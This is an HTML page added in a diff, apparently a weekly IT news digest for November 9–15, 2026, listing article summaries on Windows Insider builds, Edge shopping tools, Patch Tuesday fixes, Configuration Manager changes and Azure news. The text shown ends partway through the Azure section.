@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IT News Digest — 2026-W46</title>
+  <style>
+    :root{--bg:#f8fafc;--surface:#fff;--border:#e2e8f0;--text:#1e293b;--muted:#64748b;--accent:#2563eb}
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);line-height:1.7}
+    a{color:var(--accent)}
+
+    header{background:var(--surface);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:100;box-shadow:0 1px 4px rgba(0,0,0,.08)}
+    .h-inner{max-width:1000px;margin:0 auto;padding:10px 20px;display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
+    .h-brand{font-size:1.1rem;font-weight:800;color:#1d4ed8}
+    .h-meta{font-size:.78rem;color:var(--muted)}
+    .h-controls{display:flex;gap:8px;align-items:center}
+    .btn{padding:5px 12px;border-radius:6px;font-size:.78rem;cursor:pointer;border:1px solid var(--border);background:var(--surface);color:var(--text);white-space:nowrap}
+    .btn:hover{background:#f1f5f9}
+    select.week-sel{padding:5px 10px;border-radius:6px;border:1px solid var(--border);background:var(--surface);font-size:.78rem;cursor:pointer;color:var(--text)}
+
+    .t-nav{background:var(--surface);border-bottom:1px solid var(--border);overflow-x:auto}
+    .t-nav-inner{max-width:1000px;margin:0 auto;padding:8px 20px;display:flex;gap:6px;min-width:max-content}
+    .nav-link{font-size:.72rem;padding:3px 10px;border-radius:20px;border:2px solid var(--c,#2563eb);color:var(--c,#2563eb);text-decoration:none;font-weight:600;white-space:nowrap}
+    .nav-link:hover{background:var(--c,#2563eb);color:#fff}
+
+    main{max-width:1000px;margin:0 auto;padding:24px 20px}
+
+    .week-hero{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px 24px;margin-bottom:28px;display:flex;gap:24px;align-items:center;flex-wrap:wrap}
+    .hero-title{font-size:1.6rem;font-weight:900;color:#1d4ed8}
+    .hero-sub{font-size:.85rem;color:var(--muted);margin-top:2px}
+    .stat-box{text-align:center;min-width:60px}
+    .stat-num{font-size:2rem;font-weight:900;color:#1d4ed8;line-height:1}
+    .stat-lbl{font-size:.65rem;text-transform:uppercase;letter-spacing:.06em;color:var(--muted)}
+
+    .topic-section{margin-bottom:40px}
+    .topic-title{font-size:1.2rem;font-weight:800;color:var(--c,#2563eb);border-bottom:3px solid var(--c,#2563eb);padding-bottom:8px;margin-bottom:14px}
+    .count{font-size:.8rem;font-weight:400;color:var(--muted)}
+    .no-news{color:var(--muted);font-style:italic;font-size:.88rem}
+
+    .article-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:16px;margin-bottom:12px;display:flex;gap:12px;align-items:flex-start;transition:border-color .15s}
+    .article-card:hover{border-color:#94a3b8}
+    .article-body{flex:1;min-width:0}
+    .article-title{font-size:.98rem;font-weight:600;text-decoration:none;display:block;margin-bottom:4px;color:var(--accent)}
+    .article-title:hover{text-decoration:underline}
+    .article-meta{font-size:.72rem;color:var(--muted);margin-bottom:8px}
+
+    .article-summary{margin-top:6px;font-size:.875rem;color:#334155;line-height:1.75}
+    .article-summary p{margin-bottom:.6em}
+    .article-summary p:last-child{margin-bottom:0}
+    .gnews-badge{display:inline-block;font-size:.65rem;background:#fef3c7;color:#92400e;border-radius:4px;padding:1px 5px;margin-bottom:6px;vertical-align:middle}
+    .article-summary.snippet{color:var(--muted)}
+    .read-more{display:inline-block;margin-top:6px;font-size:.8rem;font-weight:600;color:var(--accent);text-decoration:none}
+    .read-more:hover{text-decoration:underline}
+
+    .hide-btn{flex-shrink:0;padding:5px 10px;border-radius:6px;font-size:.72rem;cursor:pointer;border:1px solid var(--border);background:var(--surface);color:var(--muted);white-space:nowrap;align-self:flex-start}
+    .hide-btn:hover{border-color:#ef4444;color:#ef4444;background:#fef2f2}
+    .lbl-show{display:none}
+
+    .article-card.is-hidden{display:none}
+    body.reveal-hidden .article-card.is-hidden{display:flex;opacity:.45;border-style:dashed}
+    .article-card.is-hidden .lbl-hide{display:none}
+    .article-card.is-hidden .lbl-show{display:inline}
+    body.reveal-hidden .article-card.is-hidden .hide-btn{border-color:#16a34a;color:#16a34a}
+    body.reveal-hidden .article-card.is-hidden .hide-btn:hover{background:#f0fdf4}
+
+    footer{text-align:center;padding:24px 20px;color:var(--muted);font-size:.75rem;border-top:1px solid var(--border);margin-top:40px}
+
+    @media(max-width:600px){
+      .h-inner,.main{padding-left:14px;padding-right:14px}
+      .hero-title{font-size:1.3rem}
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="h-inner">
+    <div>
+      <div class="h-brand">IT News Digest</div>
+      <div class="h-meta">Week 2026-W46 &bull; Nov 09–15, 2026</div>
+    </div>
+    <div class="h-controls">
+      <button class="btn" id="reveal-btn" onclick="toggleReveal()">Show hidden</button>
+      <select class="week-sel" id="week-sel" onchange="if(this.value) location.href=this.value">
+        <option value="">&#128337; Archive&hellip;</option>
+      </select>
+    </div>
+  </div>
+</header>
+
+<nav class="t-nav"><div class="t-nav-inner"><a href="#windows" class="nav-link" style="--c:#0078D4">Microsoft Windows</a><a href="#azure" class="nav-link" style="--c:#00BCF2">Azure</a><a href="#sharepoint" class="nav-link" style="--c:#036C70">SharePoint</a><a href="#intune" class="nav-link" style="--c:#0F6CBD">Intune</a><a href="#entraid" class="nav-link" style="--c:#6B69D6">Entra ID</a><a href="#m365" class="nav-link" style="--c:#D83B01">Microsoft 365</a><a href="#iru" class="nav-link" style="--c:#7C3AED">Iru MDM (formerly Kandji)</a><a href="#cato" class="nav-link" style="--c:#FF6B35">Cato Networks</a></div></nav>
+
+<main>
+  <div class="week-hero">
+    <div>
+      <div class="hero-title">Week 2026-W46</div>
+      <div class="hero-sub">Nov 09–15, 2026</div>
+    </div>
+    <div class="stat-box">
+      <div class="stat-num">45</div>
+      <div class="stat-lbl">Articles</div>
+    </div>
+  </div>
+
+    <section id="windows" class="topic-section">
+      <h2 class="topic-title" style="--c:#0078D4">Microsoft Windows <span class="count">(8)</span></h2>
+      <div class="article-card" data-id="a467a0e0de7">
+        <div class="article-body">
+          <a href="https://blogs.windows.com/windows-insider/2026/11/13/announcing-new-builds-for-13-november-2026/" target="_blank" rel="noopener noreferrer" class="article-title">Announcing new builds for 13 November 2026</a>
+          <div class="article-meta">blogs.windows.com &bull; Nov 13, 2026</div>
+          <div class="article-summary"><p>Announcing new builds for 13 November 2026
+Hello Windows Insiders,
+Today, we’re releasing new Windows 11 Insider Preview builds to the Beta (26H1), Experimental (26H1) and Experimental (Future Platforms) channels only. We will provide updates on the regular Beta and Experimental channels next week. We also have Release Preview builds going out today for 25H2/26H2 and 26H1.
+New builds this week
+Select your channel below to view its release notes:
+- Beta (26H1): Build 28020.3532
+- Experimental (26H1): Build 28120.3542
+- Experimental (Future Platforms): Build 29708.1003
+Release Preview release notes:
+- Release Preview (25H2/26H2): Build 26200.10066/Build 26300.10066
+- Release Preview (26H1): Build 28000.3612
+Thanks,
+Stephen and the Windows Insider Program team
+					Tags:</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a467a0e0de7')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="afdc153726d">
+        <div class="article-body">
+          <a href="https://blogs.windows.com/msedgedev/2026/11/09/shop-faster-and-save-money-with-built-in-tools-in-microsoft-edge/" target="_blank" rel="noopener noreferrer" class="article-title">Shop faster and save money with built-in tools in Microsoft Edge</a>
+          <div class="article-meta">blogs.windows.com &bull; Nov 09, 2026</div>
+          <div class="article-summary"><p>Shop faster and save money with built-in tools in Microsoft Edge
+It’s 11 p.m. Fifteen tabs are open, the reviews don’t agree, and you’ve checked the price three times. Then, just when you think you’re done, a promo code box appears with a code you don’t have. So, you keep shopping, long past the point you wanted to stop.
+Shopping doesn’t have to be like this.
+This holiday, Microsoft Edge is your shopping advantage; Edge recognizes the moment you’re in and does the heavy lifting with built-in shopping tools so you can shop faster.
+When you’re weighing similar products across tabs, Edge now offers to compare them for you, with a summary right alongside the page you’re on. When you’re ready to purchase, the new Checkout Savings looks for a working coupon and brings it to you. Together with Price Comparison, Cashback, Price Tracking and more, Edge brings you what you’d otherwise go hunting for, so you can find the right gift at the right price and finally call it a night.
+See why Microsoft Edge is the smarter browser for shopping on Windows here.
+What’s new in Edge this holiday
+Edge now helps where shopping often stalls: deciding and buying.
+Down to three pairs of headphones, each in its own tab? Instead of flipping back and forth to remember which had the better battery life or the better fit, let Edge do the comparing.
+Starting today, Edge recognizes when you’re weighing similar products and offers to compare them for you 1 2. One click, and Copilot generates a summary right alongside the page you’re on, comparing the product specifications, prices, and information all in one view. It even points out what makes each product stand out, so the differences that matter are easy to see.
+Still have a question? Ask Copilot while you keep browsing. Once you’ve chosen to compare, Copilot has those tabs for context, so there’s nothing to explain again.
+You’re always in control. Edge only offers to help when it notices similar products in your open tabs, and it reviews those pages in full only after you choose to compare. Prefer to shop without it? Turn it off anytime in Edge Settings.
+You’ve found the right gift and added it to your cart. And there it is: the empty promo-code box. Do you leave the page to search for a code, or pay and hope you didn’t miss a deal?
+Now you don’t have to choose. When you reach checkout, the new Checkout Savings in Edge looks for coupons in the background and can surface a coupon at checkout when one is available 2. There are no coupon-site detours and nothing to install. It’s built right into your browser.
+From first tab to crossing it off your list
+Let’s face it: shopping is a string of overwhelming moments. Is this the right one? Is this a good price? Is this a real deal? Edge’s existing shopping features help in each moment, recognizing where you are in the process and bringing you what you need, right when you need it.
+Know you got a good price. Found the right gift? Edge can show you when the same item is available for less at another retailer, helping you compare before you buy.
+Know it’s a real deal. Price History shows how an item’s price has moved over time, so you can tell whether today’s “deal” is really a deal. Not ready to buy yet? Turn on Price Tracking, and Edge will alert you when the price drops, so you can stop checking and buy when the time is right.
+Earn on what you were already buying. When you arrive at an eligible retailer, Edge offers you Cashback. Just activate the offer before purchasing to become eligible to earn cashback, subject to applicable terms, so you’re set to earn on a gift you were buying anyway, before you’ve added anything to your cart. Learn more about earning cashback in Edge
+Edge has helped shoppers save nearly $30 million in total so far this year. Now, Cashback and the new Checkout Savings help you can finish your purchase with confidence, knowing Edge looked for savings so you didn’t have to.
+Everything in one place.</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('afdc153726d')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="aaf1635d76c">
+        <div class="article-body">
+          <a href="https://petri.com/microsoft-november-2026-patch-tuesday-updates/" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft’s November 2026 Patch Tuesday Updates Fix 63 Critical Flaws</a>
+          <div class="article-meta">petri.com &bull; Nov 11, 2026</div>
+          <div class="article-summary"><p>Microsoft's November 2026 Patch Tuesday release fixes 1,090 vulnerabilities, including an Outlook flaw that is already being exploited. For organizations, timely patching is critical to reduce exposure to credential theft, remote code execution, and privilege escalation attacks.</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('aaf1635d76c')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="ae140268542">
+        <div class="article-body">
+          <a href="https://petri.com/configuration-manager-2609-cmg-sql-server-changes/" target="_blank" rel="noopener noreferrer" class="article-title">Configuration Manager 2609 Drops SQL Server 2016 Support and Updates CMG Infrastructure</a>
+          <div class="article-meta">petri.com &bull; Nov 10, 2026</div>
+          <div class="article-summary"><p>Microsoft's Configuration Manager 2609 release introduces new platform requirements, Cloud Management Gateway changes, and security updates. For enterprises, the upgrade may require SQL Server modernization, Azure quota reviews, and CMG configuration validation before deployment.</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('ae140268542')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a5e94219b90">
+        <div class="article-body">
+          <a href="https://www.bleepingcomputer.com/news/microsoft/microsoft-confirms-windows-activation-failures-after-november-updates/" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft confirms Windows activation failures after November updates</a>
+          <div class="article-meta">bleepingcomputer.com &bull; Nov 13, 2026</div>
+          <div class="article-summary snippet"><p>Microsoft has confirmed that this month's Patch Tuesday security updates are causing Windows activation and licensing failures with 0x80041008 error codes. [...]</p><a href="https://www.bleepingcomputer.com/news/microsoft/microsoft-confirms-windows-activation-failures-after-november-updates/" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a5e94219b90')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="afb19292283">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMipgJBVV95cUxONGowSE9xN2R1ak1JaTZ0ZkxNWU9hSlowMWZBdmxjSWNjbmUtRGMyUDJDVE1rb0lMVUpxYzVNcFkzMzF3YURWNGNXY0JkYmdIai1TSUZGMUdhcnJYSGZUZlpEOGpRd04taWJ5MzF5SmsyZUdfemR4MTV4Rnp1LWpFX21LWk8yeGNPWExHWjBQR3FIRTN6bjNJLW5NYVMtOU9wcTVXMl96NFlvT3UzQnhyNzdldEluLUQtNXNfM1oxTmhmUG40eU81RVVwMTN1LXNvekNOWWZSNXRmXzZSbWU0dkhMVjVzaTcxU2VqcHV5MnVNTkNhYXNyN1pyYUF1VVhQZDU1U3dBbUtpdW03OVBJaW8wbzIzUVlVMUY5N3loVHozMG1FQkE?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Windows 11’s big redesign has started shipping, and the first thing it kills is the Windows 8-era pop-up that asks what to do every time you plug in your phone - Windows Latest</a>
+          <div class="article-meta">Windows Latest &bull; Nov 14, 2026</div>
+          <div class="article-summary snippet"><p>Windows 11’s big redesign has started shipping, and the first thing it kills is the Windows 8-era pop-up that asks what to do every time you plug in your phone&amp;nbsp;&amp;nbsp;Windows Latest</p><a href="https://news.google.com/rss/articles/CBMipgJBVV95cUxONGowSE9xN2R1ak1JaTZ0ZkxNWU9hSlowMWZBdmxjSWNjbmUtRGMyUDJDVE1rb0lMVUpxYzVNcFkzMzF3YURWNGNXY0JkYmdIai1TSUZGMUdhcnJYSGZUZlpEOGpRd04taWJ5MzF5SmsyZUdfemR4MTV4Rnp1LWpFX21LWk8yeGNPWExHWjBQR3FIRTN6bjNJLW5NYVMtOU9wcTVXMl96NFlvT3UzQnhyNzdldEluLUQtNXNfM1oxTmhmUG40eU81RVVwMTN1LXNvekNOWWZSNXRmXzZSbWU0dkhMVjVzaTcxU2VqcHV5MnVNTkNhYXNyN1pyYUF1VVhQZDU1U3dBbUtpdW03OVBJaW8wbzIzUVlVMUY5N3loVHozMG1FQkE?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('afb19292283')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="ad378496909">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMixwFBVV95cUxPZjlRR3M2R3lwTGJ1TXZlWGlzY01aV2E0R24zbnVWdTRoU2NVUDRadDA0ODNLWktPbWVrN0tocUNKUEVqWnBId0JXWmppYjdEd0M5cUlUVG9JcDRXSGQ3MC1tWXlhMTlDNGJlYjlSUUtJVVMybURXWU1TbV9RSl82VDAycjF4X3JHVDVzeGVoYy1jSGlubjR1a1pvLXczYlg2aE9QUWxRVzVPaVhIYzJXUFpnLUVVRTFzaHE5OWRZVVRZWlRfckdF?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">I tried this free Windows 11 optimizer, and it does far more than simply “debloat” your PC - Windows Central</a>
+          <div class="article-meta">Windows Central &bull; Nov 14, 2026</div>
+          <div class="article-summary snippet"><p>I tried this free Windows 11 optimizer, and it does far more than simply “debloat” your PC&amp;nbsp;&amp;nbsp;Windows Central</p><a href="https://news.google.com/rss/articles/CBMixwFBVV95cUxPZjlRR3M2R3lwTGJ1TXZlWGlzY01aV2E0R24zbnVWdTRoU2NVUDRadDA0ODNLWktPbWVrN0tocUNKUEVqWnBId0JXWmppYjdEd0M5cUlUVG9JcDRXSGQ3MC1tWXlhMTlDNGJlYjlSUUtJVVMybURXWU1TbV9RSl82VDAycjF4X3JHVDVzeGVoYy1jSGlubjR1a1pvLXczYlg2aE9QUWxRVzVPaVhIYzJXUFpnLUVVRTFzaHE5OWRZVVRZWlRfckdF?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('ad378496909')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="aabb41b5661">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMipwFBVV95cUxQWjNDbzUwNDBQYkZnVGR2eWpJM1Y1YmJOZjJkQ0JmbVZlUTdaUnhhOWNBaS1TX2laOHlxRkhzQVh3UWtFa21EX3F0dDI4bEpOOWE1Rk5xRk5hd29Sa0N4eVZud1JPR2ptdlQybTdZaE1qcTBFR2JtaDlMUHFjaEtnTHl2eElFcXI1VTFMQmNhOVRTMjFoX2d1dzAyNklVTUFHOXpLaFV4Zw?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Windows ships with a disposable sandbox, and it's the safest way to open anything sketchy - XDA</a>
+          <div class="article-meta">XDA &bull; Nov 15, 2026</div>
+          <div class="article-summary snippet"><p>Windows ships with a disposable sandbox, and it's the safest way to open anything sketchy&amp;nbsp;&amp;nbsp;XDA</p><a href="https://news.google.com/rss/articles/CBMipwFBVV95cUxQWjNDbzUwNDBQYkZnVGR2eWpJM1Y1YmJOZjJkQ0JmbVZlUTdaUnhhOWNBaS1TX2laOHlxRkhzQVh3UWtFa21EX3F0dDI4bEpOOWE1Rk5xRk5hd29Sa0N4eVZud1JPR2ptdlQybTdZaE1qcTBFR2JtaDlMUHFjaEtnTHl2eElFcXI1VTFMQmNhOVRTMjFoX2d1dzAyNklVTUFHOXpLaFV4Zw?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('aabb41b5661')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+    </section>
+    <section id="azure" class="topic-section">
+      <h2 class="topic-title" style="--c:#00BCF2">Azure <span class="count">(8)</span></h2>
+      <div class="article-card" data-id="aaf1635d76c">
+        <div class="article-body">
+          <a href="https://petri.com/microsoft-november-2026-patch-tuesday-updates/" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft’s November 2026 Patch Tuesday Updates Fix 63 Critical Flaws</a>
+          <div class="article-meta">petri.com &bull; Nov 11, 2026</div>
+          <div class="article-summary"><p>Microsoft's November 2026 Patch Tuesday release fixes 1,090 vulnerabilities, including an Outlook flaw that is already being exploited. For organizations, timely patching is critical to reduce exposure to credential theft, remote code execution, and privilege escalation attacks.</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('aaf1635d76c')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="ab5277aba3d">
+        <div class="article-body">
+          <a href="https://petri.com/microsoft-fixes-470-flaws-azure-linux-update/" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft Fixes More Than 470 Vulnerabilities in Azure Linux Update</a>
+          <div class="article-meta">petri.com &bull; Nov 10, 2026</div>
+          <div class="article-summary"><p>Microsoft's latest Azure Linux release addresses more than 470 vulnerability references across critical cloud infrastructure components. For organizations, the update highlights both the importance of timely patching and the growing operational challenge of managing security at cloud scale.</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('ab5277aba3d')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a49f0caf1de">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMiZEFVX3lxTFBkb0ttbGlxMjFoWi0zam5BRDVmMWRpRTVXTXFqd2RZSy1rTGxoXzhLUnN1Tm1lbC1Zb2lYYzRVWE1DVDBRQ2RJSm1KR3pFTWZ2ZldvWEVwRVdndHF6Wk1KR0hxTXQ?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Why Microsoft keeps going down: 7 common causes of cloud outages, explained - qz.com</a>
+          <div class="article-meta">qz.com &bull; Nov 12, 2026</div>
+          <div class="article-summary snippet"><p>Why Microsoft keeps going down: 7 common causes of cloud outages, explained&amp;nbsp;&amp;nbsp;qz.com</p><a href="https://news.google.com/rss/articles/CBMiZEFVX3lxTFBkb0ttbGlxMjFoWi0zam5BRDVmMWRpRTVXTXFqd2RZSy1rTGxoXzhLUnN1Tm1lbC1Zb2lYYzRVWE1DVDBRQ2RJSm1KR3pFTWZ2ZldvWEVwRVdndHF6Wk1KR0hxTXQ?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a49f0caf1de')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a23a65f6892">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMiywFBVV95cUxNNzdRTXg1U2hNekpRcTQzajZMLU9wUURzYXlxZ3VCREstOFZfdThFaldfS3RIUzRzVTRpTnRhMTZVZUUxcDJmZzM5QWpOLUZMdVlfQ0dDZjZGVUhRQ1ZlTTloY0VMUFJleXNuVDJFRm1lSWEyLVU2aURTTXdQT21MYmxFN0ZzVGxZekxDcXFrbjJDS0ZLRGhYWl9MdGsyRHVWNEp2SVVQV3R3VTI1YjNmSWRlUlFjSWVraTA4cWxtZ0pMUXNQN2Z5RzREbw?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Ohio State–Microsoft partnership, reported at $250M, targets 70–80% shift to Azure - MarketScale</a>
+          <div class="article-meta">MarketScale &bull; Nov 14, 2026</div>
+          <div class="article-summary snippet"><p>Ohio State–Microsoft partnership, reported at $250M, targets 70–80% shift to Azure&amp;nbsp;&amp;nbsp;MarketScale</p><a href="https://news.google.com/rss/articles/CBMiywFBVV95cUxNNzdRTXg1U2hNekpRcTQzajZMLU9wUURzYXlxZ3VCREstOFZfdThFaldfS3RIUzRzVTRpTnRhMTZVZUUxcDJmZzM5QWpOLUZMdVlfQ0dDZjZGVUhRQ1ZlTTloY0VMUFJleXNuVDJFRm1lSWEyLVU2aURTTXdQT21MYmxFN0ZzVGxZekxDcXFrbjJDS0ZLRGhYWl9MdGsyRHVWNEp2SVVQV3R3VTI1YjNmSWRlUlFjSWVraTA4cWxtZ0pMUXNQN2Z5RzREbw?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a23a65f6892')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a36519ce074">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMihAFBVV95cUxQRjhFNXlzcGc5N2EtQm9VZHdTRWphS1pzc0VRd2VOYk0zUkJObGxwVVNQV3h4X1AyZGxTd0lYZmVPQ3NXLWxNU0tkYlR6TTEtNkpJMmtqemlYTXUxTnpiY0FTS09yZENlcmlrNTg3dFpUN2l1TzZhNkNtOTZjakNETnpJYVg?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">AWS vs Azure: 26% vs 19% Share, 39% vs 48% Growth [2026] - shattered.io</a>
+          <div class="article-meta">shattered.io &bull; Nov 14, 2026</div>
+          <div class="article-summary snippet"><p>AWS vs Azure: 26% vs 19% Share, 39% vs 48% Growth [2026]&amp;nbsp;&amp;nbsp;shattered.io</p><a href="https://news.google.com/rss/articles/CBMihAFBVV95cUxQRjhFNXlzcGc5N2EtQm9VZHdTRWphS1pzc0VRd2VOYk0zUkJObGxwVVNQV3h4X1AyZGxTd0lYZmVPQ3NXLWxNU0tkYlR6TTEtNkpJMmtqemlYTXUxTnpiY0FTS09yZENlcmlrNTg3dFpUN2l1TzZhNkNtOTZjakNETnpJYVg?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a36519ce074')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a534d70697b">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMipAJBVV95cUxOQnFnQjcxRi12T2hTdWxIREpCbXBWV18xSUtUczk1Ml85VnJXNThxTlljUWhBV1ZTR2dfcExwd29LblpQeFU2QUlJQTdMMVBhdzR1TGw1eW5HNVRLVFRybEMydVdpOFBJdHFWM2RTb1VXOHpEVjFGYnlWdzhEVmZIelRzZmdoSjVCU05QUS1FU2hlbUtPUVZJM1VnVk9ZdzVrMlNCRnIxMHFOeGlkbmZYZFlCUFRJTkZOV2xCX2VtTkNWV0dOMWJuWHZwdnJYeUpfRURIajVGWHdzWGVJNE5xZTBfdnJBYllZdmduWlhjOXB2dEFaZUtyaUxyV3FqRy0xZ0dYcUs0MVltSzlvSS1xakFkdUN2RFNTWFJKZ3ZId2RuSU1U?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft and Qatar’s Ministry of Communications and Information Technology mark availability of Azure OpenAI Service in Foundry in Qatar at MWC26 Doha - Microsoft Source</a>
+          <div class="article-meta">Microsoft Source &bull; Nov 10, 2026</div>
+          <div class="article-summary snippet"><p>Microsoft and Qatar’s Ministry of Communications and Information Technology mark availability of Azure OpenAI Service in Foundry in Qatar at MWC26 Doha&amp;nbsp;&amp;nbsp;Microsoft Source</p><a href="https://news.google.com/rss/articles/CBMipAJBVV95cUxOQnFnQjcxRi12T2hTdWxIREpCbXBWV18xSUtUczk1Ml85VnJXNThxTlljUWhBV1ZTR2dfcExwd29LblpQeFU2QUlJQTdMMVBhdzR1TGw1eW5HNVRLVFRybEMydVdpOFBJdHFWM2RTb1VXOHpEVjFGYnlWdzhEVmZIelRzZmdoSjVCU05QUS1FU2hlbUtPUVZJM1VnVk9ZdzVrMlNCRnIxMHFOeGlkbmZYZFlCUFRJTkZOV2xCX2VtTkNWV0dOMWJuWHZwdnJYeUpfRURIajVGWHdzWGVJNE5xZTBfdnJBYllZdmduWlhjOXB2dEFaZUtyaUxyV3FqRy0xZ0dYcUs0MVltSzlvSS1xakFkdUN2RFNTWFJKZ3ZId2RuSU1U?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a534d70697b')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a477567376a">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMirwFBVV95cUxQWTZZTEJKUGdxM2FaT2ZGcGY0bFdoeXBlc3l0ODRaUmxNbVpQWFdYc1dDdmF2QW9abXJyRV9JV1FYZDF3SXlBSHFYc2c0M3d0Q0NLSkZURTNhUG5sMmwtQlVKbFdKQmJMaUF3bDlNbHkyakllM1ZTV2RUMWpKVUtleUpud2gydDBGeG1xeGpsWGZQTVRkLW92b25kbzFhd2Mzd0pWMURsM3dLNzRSczJF?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Ohio State University to migrate infrastructure to Microsoft Azure - Data Center Dynamics</a>
+          <div class="article-meta">Data Center Dynamics &bull; Nov 11, 2026</div>
+          <div class="article-summary snippet"><p>Ohio State University to migrate infrastructure to Microsoft Azure&amp;nbsp;&amp;nbsp;Data Center Dynamics</p><a href="https://news.google.com/rss/articles/CBMirwFBVV95cUxQWTZZTEJKUGdxM2FaT2ZGcGY0bFdoeXBlc3l0ODRaUmxNbVpQWFdYc1dDdmF2QW9abXJyRV9JV1FYZDF3SXlBSHFYc2c0M3d0Q0NLSkZURTNhUG5sMmwtQlVKbFdKQmJMaUF3bDlNbHkyakllM1ZTV2RUMWpKVUtleUpud2gydDBGeG1xeGpsWGZQTVRkLW92b25kbzFhd2Mzd0pWMURsM3dLNzRSczJF?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a477567376a')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a0a2a14108c">
+        <div class="article-body">
